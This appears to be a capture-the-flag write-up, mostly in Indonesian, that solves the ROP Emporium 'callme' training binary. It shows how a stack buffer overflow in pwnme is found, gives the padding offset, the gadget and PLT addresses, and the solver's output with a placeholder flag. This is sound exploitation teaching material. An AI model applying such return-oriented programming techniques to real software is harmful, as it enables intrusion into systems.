# callme-writeup
NOTE : write up ini ditulis berdasarkan file binary x86-64

**instruksi:**
You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. 
callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag.  
For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

# Tools 
- gdb
- rabin2 (radare2)
- ROPgadget

# step by step exploit

as usual, aku analysis menggunakan gdb dan melihat daftar fungsi tersedia.

fungsi tersedia :
- main
- pwnme
- usefulFunctions
- usefulgadgets

tidak ada hal menarik di main, 

di dalam fungsi pwnme terdapat kerentanan buffer overflow karena stack hanya memiliki ukuran buffer sebesar **0x20** sedangkan ada fungsi read yang membaca hingga **0x200**  
ini dapat memicu buffer overflow dalam jumlah yang cukup besar. 

```Assembly
   0x0000000000400898 <+0>:     push   rbp
   0x0000000000400899 <+1>:     mov    rbp,rsp
   0x000000000040089c <+4>:     sub    rsp,0x20 <-- ukuran buffer
   -----------------------:     ---    ---,----
   0x00000000004008d3 <+59>:    mov    edx,0x200 <-- byte yang dibaca read()
   0x00000000004008d8 <+64>:    mov    rsi,rax
   0x00000000004008db <+67>:    mov    edi,0x0
   0x00000000004008e0 <+72>:    call   0x400710 <read@plt>
```

jarak buffer ke saved rbp adalah 0x20, maka return address adalah 0x20 + ukuran saved rbp. pada binary x86-64 ukuran saved rbp adalah 8 byte. maka 0x20 + 8 = `0x28`

padding = `0x28` byte

pada fungsi usefulFunctions tersedia 3 fungsi callme yang masing masing memerlukan 3 argumen seperti instruksi dari rop emporium
```Assembly
   0x0000000000400905 <+19>:    call   0x4006f0 <callme_three@plt>
   0x0000000000400919 <+39>:    call   0x400740 <callme_two@plt>
   0x000000000040092d <+59>:    call   0x400720 <callme_one@plt>
```

terakhir fungsi usefulgadget menyediakan Gadget untuk memasukkan argumen ke dalam fungsi fungsi callme tersebut.
```Assembly
Dump of assembler code for function usefulGadgets:
   0x000000000040093c <+0>:     pop    rdi
   0x000000000040093d <+1>:     pop    rsi
   0x000000000040093e <+2>:     pop    rdx
   0x000000000040093f <+3>:     ret
```

semua data sudah tersedia, namun aku tidak berencana mengekstrak data itu dari gdb karena alamat addressnya sering kali tidak valid.jadi aku lebih memilih menggunakan
tools ROPgadget untuk mencari address gadget dan rabin2 untuk fungsi callme nya.

**gadget**
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(callme)
└> ROPgadget --binary ./callme | grep "pop rdi ;"
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
```
gadget address = 0x40093c

**func**
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(callme)
└> rabin2 -s callme | grep callme_
nth paddr        vaddr      bind   type size     lib name
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

3   0x000006f0 0x004006f0 GLOBAL FUNC   16       imp.callme_three
7   0x00000720 0x00400720 GLOBAL FUNC   16       imp.callme_one
10  0x00000740 0x00400740 GLOBAL FUNC   16       imp.callme_two
```

alamat callme yang aku gunakan adalah alamat sebelah kanan (vaddr)

callme_one = 0x00400720   
callme_two = 0x00400740   
callme_three = 0x004006f0   

semua data sudah dimiliki, aku membuat [skrip ini](solver.py) dan mengambil flagnya

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(callme)
└> python3 solver.py
[*] '/home/rotalactf/reno/pwn/rop-emporium/callme/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process './callme': pid 10211
[*] Switching to interactive mode
[*] Process './callme' stopped with exit code 0 (pid 10211)
callme by ROP Emporium
x86_64

Hope you read the instructions...

> Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
```
gokil...
